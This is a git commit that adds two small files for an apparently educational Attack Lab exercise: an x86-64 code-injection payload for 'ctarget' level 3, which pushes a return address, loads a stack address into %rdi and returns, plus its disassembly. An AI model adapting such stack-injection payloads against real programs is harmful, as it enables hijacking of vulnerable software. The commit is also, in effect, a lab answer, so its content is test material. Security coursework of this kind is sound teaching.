276ad1fb8593688085f3c370adb442545bf6d6eb
winter <mywinter.h@gmail.com>
2022-07-17 12:43:48 +0000

    attach lab finished

---
+++ 3-attacklab/ctarget_l3.s
@@ -0,0 +1,3 @@
+movq $0x4018fa, (%rsp)
+movq $0x5561dc78, %rdi
+retq
---
+++ 3-attacklab/level3.s
@@ -0,0 +1,11 @@
+
+ctarget_l3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 04 24 fa 18 40 	movq   $0x4018fa,(%rsp)
+   7:	00 
+   8:	48 c7 c7 78 dc 61 55 	mov    $0x5561dc78,%rdi
+   f:	c3                   	retq   
